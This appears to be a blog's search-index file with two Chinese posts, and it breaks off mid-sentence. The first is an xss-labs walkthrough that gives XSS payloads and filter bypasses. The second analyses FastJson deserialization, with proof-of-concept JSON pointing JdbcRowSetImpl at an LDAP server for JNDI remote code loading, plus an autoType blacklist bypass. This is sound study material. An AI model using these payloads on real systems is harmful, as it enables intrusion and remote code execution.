<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>xss_lab题解</title>
    <link href="/2025/10/29/xss_lab%E9%A2%98%E8%A7%A3/"/>
    <url>/2025/10/29/xss_lab%E9%A2%98%E8%A7%A3/</url>
    
    <content type="html"><![CDATA[<h1 id="xss-lab"><a href="#xss-lab" class="headerlink" title="xss_lab"></a>xss_lab</h1><h2 id="1"><a href="#1" class="headerlink" title="1"></a>1</h2><ul><li><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027202839482.png" alt="image-20250225214917570"></p><p>name和网页相对应</p></li><li><p>直接在name&#x3D;xxxx写js代码进行盗取 <strong>实现弹窗</strong></p></li><li><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027202840955.png" alt="image-20250225215318083"></p></li><li><p><strong>name&#x3D;<script>while(true){alert(1);}</script></strong></p></li></ul><h2 id="2"><a href="#2" class="headerlink" title="2"></a>2</h2><ul><li><p>keyword和网页相对应</p></li><li><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027202842618.png" alt="image-20250225215415349"></p><p>无反应</p></li><li><p>查看源代码</p></li><li><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027202845248.png" alt="image-20250225215801590"></p><p><img src="C:\Users\95227\AppData\Roaming\Typora\typora-user-images\image-20250225220029224.png" alt="image-20250225220029224"></p><p>未闭合</p></li><li><p><img src="C:\Users\95227\AppData\Roaming\Typora\typora-user-images\image-20250225220400827.png" alt="image-20250225220400827"></p></li><li><p><strong>加一个“&gt;代表闭合</strong></p></li></ul><h2 id="3"><a href="#3" class="headerlink" title="3"></a>3</h2><ul><li><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027202850161.png" alt="image-20250226170011929"></p><p>未闭合</p></li><li><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027202851153.png" alt="image-20250226170515351"></p><p>单加一个**‘单引号’**   发现存在html转义编码”&lt;”&gt;”</p></li><li><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027202852560.png" alt="image-20250227221510910"></p><p>使用onclick&#x3D;“copyText（）进行闭合**（题目为单引号闭合）**</p></li><li><p>执行之后，点击搜索框<strong>触发</strong></p><p>**注：**onclick&#x3D;“copyText（）</p><ul><li><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027202853800.png" alt="image-20250227223100507"></li></ul></li></ul><h2 id="4"><a href="#4" class="headerlink" title="4"></a>4</h2><ul><li><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027202855186.png" alt="image-20250227221954304"></p><p>点击查询查看</p></li><li><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027202856970.png" alt="image-20250227222107620"></p><p>先闭合使用    <strong>“</strong></p></li><li><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027202858663.png" alt="image-20250227222313266"></p><p>使用onclick&#x3D;“copyText（）<strong>（copyText（）为js弹窗脚本）</strong></p></li></ul><h2 id="5"><a href="#5" class="headerlink" title="5"></a>5</h2><ul><li><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027202900495.png" alt="image-20250227223741540"></p><p>onclick出现下划线（过滤onclick）</p></li><li><p>使用超链接进行绕过</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027202901654.png" alt="image-20250227223939914"></p><p>在对话框写入</p><p>形成超链接，点击就可通过</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027202903576.png" alt="image-20250227224038881"></p><p>”&gt;<a href='javascript:alert(1)'></p></li></ul><h2 id="6"><a href="#6" class="headerlink" title="6"></a>6</h2><ul><li><p>再次写入超链接</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027202905079.png" alt="image-20250227224252242"></p><p>href出现下划线（过滤href）</p></li><li><p>修改大小写</p><p>”&gt;<a Href='javasCript:alert(1)'></p><p>完成过滤</p></li></ul><h2 id="7"><a href="#7" class="headerlink" title="7"></a>7</h2><ul><li><p>原代码</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027202906538.png" alt="image-20250227224555322"></p><p>过滤为空</p></li><li><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027202907901.png" alt="image-20250227224615994"></p><p>不是循环过滤（只过滤一次）</p></li><li><p>”&gt;<a hrefhref='javascriptcript:alert(1)'></p><p>多写几个即可绕过</p></li></ul><h2 id="8"><a href="#8" class="headerlink" title="8"></a>8</h2><ul><li><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027202909167.png" alt="image-20250227224756097"></p><p>已经存在</p><p><strong>”&gt;&lt;a href</strong></p></li><li><p>在输入框直接写入</p><p><strong>javascript:alert(1)</strong></p></li><li><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027202910629.png" alt="image-20250227224904878"></p><p>再次出现下划线过滤</p></li><li><p>修改大小写也不行</p></li><li><p>使用编码进行过滤</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027202911638.png" alt="image-20250227225109222"></p></li></ul><h2 id="9"><a href="#9" class="headerlink" title="9"></a>9</h2><ul><li><p>填入编码代价</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027202918823.png" alt="image-20250227225155296"></p></li><li><p>查看源代码</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027202924068.png" alt="image-20250227225232942"></p><p>没有写入http&#x2F;&#x2F; 就不可执行</p></li><li><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027202925245.png" alt="image-20250227225340042"></p><p>存在干扰(http:&#x2F;&#x2F;干扰js代码)</p></li><li><p>使用&#x2F;&#x2F;进行注释</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027202926894.png" alt="image-20250227225420332"></p></li></ul><h2 id="10"><a href="#10" class="headerlink" title="10"></a>10</h2><ul><li><p>隐藏数据</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027202928882.png" alt="image-20250227230159477"></p><p><strong>hidden</strong></p></li><li><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027202931247.png" alt="image-20250227230424159"><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027202934518.png" alt="image-20250227230424299"></p><p>相当于使用     <strong>t_sort</strong> 进行过滤</p><p>所以直接在t_sort加入js代码</p></li><li><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027202936173.png" alt="image-20250227230537548"></p><p>存在”“闭合（记得闭合代码）</p></li><li><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027202937319.png" alt="image-20250227230649653"></p><p>写入type&#x3D;”text“（屏蔽隐藏属性，出现搜索框）</p></li><li><p>点击搜索框后，触发点击绕过</p></li></ul><h2 id="11"><a href="#11" class="headerlink" title="11"></a>11</h2><ul><li><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027202939442.png" alt="image-20250227231923294"></p><p>写入后，未显示搜索框</p></li><li><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027202941685.png" alt="image-20250228231250310"></p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027202942849.png" alt="image-20250228231322189"></p></li><li><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027202944464.png" alt="image-20250228231451655"></p><p>抓包输入返回值：referer：xxxxx（内容为显示内容 t_sort）</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027202947095.png" alt="image-20250228231600639"></p><p>出现value值</p></li><li><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027202949907.png" alt="image-20250228231711702"></p><p>将编码内容进行修改即可</p></li></ul><h2 id="12"><a href="#12" class="headerlink" title="12"></a>12</h2><ul><li><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027202952224.png" alt="image-20250228232439571"></p><p>接受浏览器权限</p></li><li><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027202953319.png" alt="image-20250228232356850"></p><p>抓包后，在对应位置加入js代码</p></li></ul><h2 id="13"><a href="#13" class="headerlink" title="13"></a>13</h2><ul><li><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027202954404.png" alt="image-20250302215338696"></li><li>修改为 “ type&#x3D;’text’ onclick&#x3D;’javascript:alert(1)’&gt;&#x2F;&#x2F;</li><li>出现对话框</li></ul><h2 id="14"><a href="#14" class="headerlink" title="14"></a>14</h2><p>题目出错</p><h2 id="15"><a href="#15" class="headerlink" title="15"></a>15</h2><ul><li><p>源代码出现</p><p><strong>ng—include</strong></p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027202956332.png" alt="image-20250302220337450"></p></li><li><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027202958110.png" alt="image-20250302220952244"></p><p>尖括号被屏蔽</p></li><li><p>无对话框，所以<strong>不使用onclick</strong>（点击）</p></li><li><p>使用img</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027202959781.png" alt="image-20250302221510739"></p><p><a href="http://xss-labs-master:81/level15.php?src=%27http://xss-labs-master:81/level1.php?name=">http://xss-labs-master:81/level15.php?src=&#39;http://xss-labs-master:81/level1.php?name=</a><img src=asd onerror=alert(1)>‘ </p><p>‘   ’为图片的格式</p></li></ul><h2 id="16"><a href="#16" class="headerlink" title="16"></a>16</h2><ul><li><p>输入代码查看过滤</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027203001876.png"></p><p>过滤了script和” ‘还有空格</p></li><li><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027203003217.png" alt="image-20250302222242463"></p><p>a标签  绕过script过滤  回车代替空格</p></li><li><p>然后点击图片</p></li></ul><h2 id="17，18-不支持"><a href="#17，18-不支持" class="headerlink" title="17，18(不支持)"></a>17，18(不支持)</h2><ul><li><p>源代码使用到了<strong>embed</strong></p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027203004735.png" alt="image-20250302223015962"></p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027203006004.png" alt="image-20250302223312646"></p><p>xss-labs-master:81&#x2F;level17.php?arg01&#x3D;a&amp;arg02&#x3D;b<strong>123 onclick&#x3D;’alert(1)’</strong></p><p>xss-labs-master:81&#x2F;level17.php?arg01&#x3D;a&amp;arg02&#x3D;b<strong>123 onmousedown&#x3D;’alert(1)’</strong></p></li></ul>]]></content>
    
    
    <categories>
      
      <category>靶场题解</category>
      
    </categories>
    
    
    <tags>
      
      <tag>靶场题解</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>FastJson反序列化</title>
    <link href="/2025/10/21/FastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    <url>/2025/10/21/FastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
    
    <content type="html"><![CDATA[<h1 id="FastJson反序列化"><a href="#FastJson反序列化" class="headerlink" title="FastJson反序列化"></a>FastJson反序列化</h1><h2 id="基础"><a href="#基础" class="headerlink" title="基础"></a>基础</h2><p>官方源码： <a href="https://github.com/alibaba/fastjson">https://github.com/alibaba/fastjson</a></p><p>使用手册： <a href="https://www.w3cschool.cn/fastjson/">https://www.w3cschool.cn/fastjson/</a></p><p>Fastjson是一个Java库，可用于将Java对象转换为它们的JSON表示。它还可以用于将JSON字符串转换为等效的Java对象。Fastjson可以处理任意Java对象，包括没有源代码的预先存在的对象。</p><p> <strong>Java 对象和 JSON 字符串互相转换</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plain">String jsonStr = JSON.toJSONString(obj);        // 对象 → JSON 字符串<br>MyClass obj = JSON.parseObject(jsonStr, MyClass.class); // JSON 字符串 → 对象<br></code></pre></td></tr></table></figure><h3 id="漏洞参考："><a href="#漏洞参考：" class="headerlink" title="漏洞参考："></a>漏洞参考：</h3><p>1.2.24及以下没有对序列化的类做校验,导致漏洞产生<br>1.2.25-1.2.41增加了黑名单限制，更改autoType默认为关闭选项。<br>1.2.42版本是对1.2.41及以下版本的黑名单绕过,代码内更新字符串黑名单hash方式<br>1.2.43版本是对1.2.42及以下版本的黑名单绕过<br>1.2.44-1.2.45版本1.2.43版本黑名单无法绕过,寻找新的利用链进行利用<br>1.2.47版本 利用fastjson处理Class类时的操作,将恶意类加载到缓存中,实现攻击<br>1.2.62-1.2.67版本Class不会再往缓存中加载恶意类,寻找新的利用链进行突破<br>1.2.68版本,使用期望类AutoCloseable来绕过fastjson校验<br>1.2.72-1.2.80使用期望类Throwable的子类,进行绕过</p><h3 id="参考文章："><a href="#参考文章：" class="headerlink" title="参考文章："></a>参考文章：</h3><p><a href="https://y4tacker.github.io/2023/03/20/year/2023/3/FastJson%E4%B8%8E%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">https://y4tacker.github.io/2023/03/20/year/2023/3/FastJson%E4%B8%8E%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</a></p><p><a href="https://yanghaoi.github.io/2024/08/18/fastjson-lou-dong-chang-jian-wa-jue-he-li-yong-fang-fa/">https://yanghaoi.github.io/2024/08/18/fastjson-lou-dong-chang-jian-wa-jue-he-li-yong-fang-fa/</a></p><p><a href="https://xz.aliyun.com/t/12728">https://xz.aliyun.com/t/12728</a><br><a href="https://mp.weixin.qq.com/s/SOKLC_No0hV9RhAavF2hcw">https://mp.weixin.qq.com/s/SOKLC_No0hV9RhAavF2hcw</a></p><p>Fastjson（TemplatesImpl&amp;JdbcRowSetImpl）</p><p><a href="https://mp.weixin.qq.com/s/XPbbgLcBmHE7dmHswY_S3Q">https://mp.weixin.qq.com/s/XPbbgLcBmHE7dmHswY_S3Q</a></p><h2 id="关于-autoType"><a href="#关于-autoType" class="headerlink" title="关于 autoType"></a>关于 autoType</h2><p><strong>AutoType</strong> 是 Fastjson 的一项功能：当 JSON 里出现特殊字段 <code>@type</code> 时，Fastjson 会把这个字符串当作 Java 类型的全限定名（<code>com.example.Foo</code>），尝试把该 JSON 反序列化为对应的 Java 类实例。换句话说，<code>@type</code> 让 JSON 能直接指定要生成哪个 Java 类的对象 —— 这是“多态反序列化”的一种实现方式。</p><p><code>@type</code> 能让不受信任的 JSON 指定任意类去实例化。许多 Fastjson 漏洞就是利用了这点（<code>com.sun.rowset.JdbcRowSetImpl</code> ）</p><p>因此，默认全开 AutoType 会把应用暴露给远程任意对象创建和潜在的代码执行。</p><h2 id="FastJson-1-2-24-反序列化链分析"><a href="#FastJson-1-2-24-反序列化链分析" class="headerlink" title="FastJson 1.2.24 反序列化链分析"></a>FastJson 1.2.24 反序列化链分析</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example.fastjson122.demos.web;<br><br><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSON;<br><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSONObject;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">FastJsonController</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-comment">//反序列化基本使用</span><br><br>        <span class="hljs-comment">//1.fastjson 解析变量数据</span><br>        <span class="hljs-comment">//Java 字符串里 &quot; 需要转义</span><br>        String str=<span class="hljs-string">&quot;&#123;\&quot;name\&quot;:\&quot;theonefx\&quot;,\&quot;age\&quot;:666&#125;&quot;</span>;<br>        <span class="hljs-comment">// JSON.parseObject(String text) 方法，把 JSON 字符串解析成一个 JSONObject 对象，解析后，Fastjson 会自动把字符串里的 JSON 结构转成 Java 对象</span><br>        <span class="hljs-type">JSONObject</span> <span class="hljs-variable">data1</span> <span class="hljs-operator">=</span> JSON.parseObject(str);<br>        <span class="hljs-comment">//直接输出 JSONObject 对象</span><br>        System.out.println(data1);<br><br>        <span class="hljs-comment">//2.fastjson 加入User类解析:传入其他类解析后默认执行 set get类方法</span><br>        <span class="hljs-comment">// 在 1.2.25+ 之后默认关闭了 AutoType 功能。主动拒绝了 @type 自动类型反序列化。</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">userStr</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&#123;\&quot;@type\&quot;:\&quot;com.example.fastjson122.demos.web.User\&quot;,\&quot;age\&quot;:22,\&quot;name\&quot;:\&quot;xiaodi\&quot;&#125;&quot;</span>;<br>        <span class="hljs-type">JSONObject</span> <span class="hljs-variable">data2</span> <span class="hljs-operator">=</span> JSON.parseObject(userStr);<br>        System.out.println(data2);<br><br>        <span class="hljs-comment">//3.fastjson 加入执行命令解析:FastJson 支持 @type 语法对应类操作</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">testStr</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&#123;\&quot;@type\&quot;:\&quot;com.example.fastjson001.demos.web.Test\&quot;,\&quot;cmd\&quot;:\&quot;calc\&quot;&#125;&quot;</span>;<br>        <span class="hljs-type">JSONObject</span> <span class="hljs-variable">data3</span> <span class="hljs-operator">=</span> JSON.parseObject(testStr);<br>        System.out.println(data3);<br><br>        <span class="hljs-comment">//4.加入Poc类解析:JdbcRowSetImpl类解析后执行setDataSourceName setAutoCommit方法</span><br>        <span class="hljs-comment">//注：控制 dataSourceName 值后调 setAutoCommit 触发 connect 里面的 lookup</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">pocStr</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&#123;\&quot;@type\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;,\&quot;dataSourceName\&quot;:\&quot;ldap://169.254.39.1:1389/rfkucd\&quot;, \&quot;autoCommit\&quot;:true&#125;\n&quot;</span>;<br>        <span class="hljs-type">JSONObject</span> <span class="hljs-variable">data4</span> <span class="hljs-operator">=</span> JSON.parseObject(pocStr);<br>        System.out.println(data4);<br><br>        <span class="hljs-comment">//触发 fastjson 反序列化用到 JSON.parseObject() &amp; JSON.parse()</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="分析链："><a href="#分析链：" class="headerlink" title="分析链："></a>分析链：</h3><p>调试分析：</p><p>此处下断点调试</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508091619576.png" alt="null"></p><p><code>parseObject</code> 方法调用 <code>parse</code> 方法解析字符串</p><p><code>parse(text)</code> 是 Fastjson 的底层解析方法。</p><p>它会根据字符串的内容返回不同的对象：</p><ul><li><p>如果是 <code>{...}</code> → 返回 <code>JSONObject</code></p></li><li><p>如果是 <code>[...]</code> → 返回 <code>JSONArray</code></p></li><li><p>如果是普通值 → 返回 <code>String</code>、<code>Number</code>、<code>Boolean</code> 等。</p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508091620453.png" alt="null"></p><p><code>JSON.DEFAULT_TYPE_KEY</code> 是一个固定值 <code>@type</code>，一旦判断值为 <code>@type</code> ，就将其认为是类的限定，之后便尝试加载<code>com.sun.rowset.JdbcRowSetImpl</code> 类。即 <code>@type</code> &#x3D; <code>com.sun.rowset.JdbcRowSetImpl</code>，fastjson 会去加载这个类。</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508091623495.png" alt="null"></p><p>步入 <code>TypeUtils.loadClass</code></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508091627769.png" alt="null"></p><p><code>config</code> 是 <code>ParserConfig</code> 对象，保存了各种类的反序列化器;<code>deserialze</code> 方法的三个参数：</p><ol><li><p><code>this</code> → 当前解析器（<code>DefaultJSONParser</code>），里面有 lexer、上下文等信息。</p></li><li><p><code>clazz</code> → 要生成的 Java 类。</p></li><li><p><code>fieldName</code> → 字段名（如果这是某个字段的值）。</p></li></ol><p>这个方法会根据 <code>clazz</code> 的结构，从 JSON 中取值，并用反射或类型转换来创建对象并赋值</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508091628887.png" alt="null"></p><p>在执行反序列化的过程中，变量中出现了 <code>JdbcRowSetImpl</code></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508091634392.png" alt="null"></p><p>经过漫长的跟踪，来到了关键点。。（对于一些不重要的判断可以跳过，追踪关键点）</p><p>这是反序列化RCE的触发点，<code>InitialContext</code> 是 JNDI（Java Naming and Directory Interface）的入口类，<code>lookup()</code> 会根据传入的地址去访问远程服务</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508091639344.png" alt="null"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508091641791.png" alt="null"></p><h3 id="总结分析链："><a href="#总结分析链：" class="headerlink" title="总结分析链："></a>总结分析链：</h3><p>parseObject -&gt;  parse -&gt; key(@type) -&gt; TypeUtils.loadClass -&gt; ObjectDeserializer -&gt; JdbcRowSetImpl -&gt; connect -&gt; lookup</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508091652348.png" alt="null"></p><p>结合 <strong>传入其他类，解析后默认执行 set get类方法</strong> 的结论，当走到 <code>JdbcRowSetImpl.class</code> 中触发了其中的set、get方法，而 <code>setAutoCommit</code> 中恰好有 <code>connect</code> 方法，触发执行了 <code>lookup</code> 方法，而 <code>lookup</code> 方法中 触发了 <code>getDataSourceName</code> ，所以 poc 构造的思路就有了：</p><ol><li><p><code>@type</code> : 告诉 Fastjson 将它反序列化成指定的 Java 类，即 “com.sun.rowset.JdbcRowSetImpl”</p></li><li><p><code>dataSourceName</code> : JDBC 连接的数据源，此处使用 <code>Java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C &quot;calc&quot;</code></p></li><li><p><code>autoCommit</code> : 调用 <code>setAutoCommit(true)</code> ，触发逻辑</p></li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs plain">&#123;\&quot;@type\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;,\&quot;dataSourceName\&quot;:\&quot;ldap://169.254.39.1:1389/rfkucd\&quot;, \&quot;autoCommit\&quot;:true&#125;<br>--&gt;<br>&#123;<br>  &quot;@type&quot;: &quot;com.sun.rowset.JdbcRowSetImpl&quot;,<br>  &quot;dataSourceName&quot;: &quot;ldap://169.254.39.1:1389/rfkucd&quot;,<br>  &quot;autoCommit&quot;: true<br>&#125;<br></code></pre></td></tr></table></figure><p>这样就可以达到 <code>lookup</code> 访问远程服务的目的，造成了反序列化RCE漏洞。</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508091653730.png" alt="null"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508091655152.png" alt="null"></p><p>当然，1.2.24 的漏洞在之后的版本已经被修复，默认不开启 autoType</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508100949058.png" alt="null"></p><h2 id="FastJson-1-2-25-1-2-47-CC链分析"><a href="#FastJson-1-2-25-1-2-47-CC链分析" class="headerlink" title="FastJson 1.2.25-1.2.47 CC链分析"></a>FastJson 1.2.25-1.2.47 CC链分析</h2><h3 id="1、开启-autoType"><a href="#1、开启-autoType" class="headerlink" title="1、开启 autoType"></a>1、开启 autoType</h3><h4 id="漏洞利用条件："><a href="#漏洞利用条件：" class="headerlink" title="漏洞利用条件："></a>漏洞利用条件：</h4><ol><li><p>开启 <code>AutoTypeSupport</code></p></li><li><p>加 <code>L</code> 和 <code>;</code></p></li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plain">ParserConfig.getGlobalInstance().setAutoTypeSupport(true);<br>String testPoc = &quot;&#123;\&quot;@type\&quot;:\&quot;Lcom.sun.rowset.JdbcRowSetImpl;\&quot;,\&quot;dataSourceName\&quot;:\&quot;ldap://169.254.39.1:1389/5uppp0\&quot;,\&quot;autoCommit\&quot;:\&quot;true\&quot;&#125;&quot;;<br>JSONObject test = JSON.parseObject(testPoc);<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508101014904.png" alt="null"></p><h4 id="POC-分析-链分析："><a href="#POC-分析-链分析：" class="headerlink" title="POC 分析&amp;链分析："></a>POC 分析&amp;链分析：</h4><p><code>JSONObject test = JSON.parseObject(testPoc);</code> 断点调试</p><p>判断 key &#x3D;&#x3D; @type</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508101025365.png" alt="null"></p><p>步入 <code>checkAutoType</code>，<code>acceptList</code>白名单，这里的 <code>checkAutoType</code> 中<code>acceptList</code> 为空数组，不会匹配白名单，而是进入下方的黑名单</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508101029937.png" alt="null"></p><p>可以看到先进入黑名单进行判断：</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508101033816.png" alt="null"></p><p>黑名单依次进行判断</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508101040522.png" alt="null"></p><p>继续执行。这一步看到判断了 <code>className</code> 的开头和结尾如果分别为<code>L</code>和<code>;</code>，则进入<code>substring</code></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508101044398.png" alt="null"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508101047885.png" alt="null"></p><p>在执行了 <code>substring</code> 之后，原本的<code>className = Lcom.sun.rowset.JdbcRowSetImpl;</code> 被替换成了 <code>newClassName = com.sun.rowset.JdbcRowSetImpl</code></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508101047540.png" alt="null"></p><p>之后同 1.2.24 的反序列化链</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508101054144.png" alt="null"></p><p><strong>接下来分析不开启</strong> <code>AutoTypeSupport</code></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508101056293.png" alt="null"></p><p>来到白名单，<code>autoTypeSupport</code> 判断为 <code>false</code></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508101057185.png" alt="null"></p><p>在这一步进行黑名单循环</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508101100575.png" alt="null"></p><p>判断为异常，报错，结束</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508101102069.png" alt="null"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508101103424.png" alt="null"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508101103380.png" alt="null"></p><h4 id="总结分析链：-1"><a href="#总结分析链：-1" class="headerlink" title="总结分析链："></a>总结分析链：</h4><p>parseObject -&gt;  key(@type) -&gt; checkAutoType -&gt; denyList -&gt; substring -&gt; loadClass -&gt; newClassName &#x3D; com.sun.rowset.JdbcRowSetImpl</p><p>这些版本都是结合黑名单进行构造绕过，比如 加 <code>L</code> 和 <code>;</code>、加 <code>LL</code> 和 <code>;;</code>、加 <code>[</code> 等等，关键点要开启 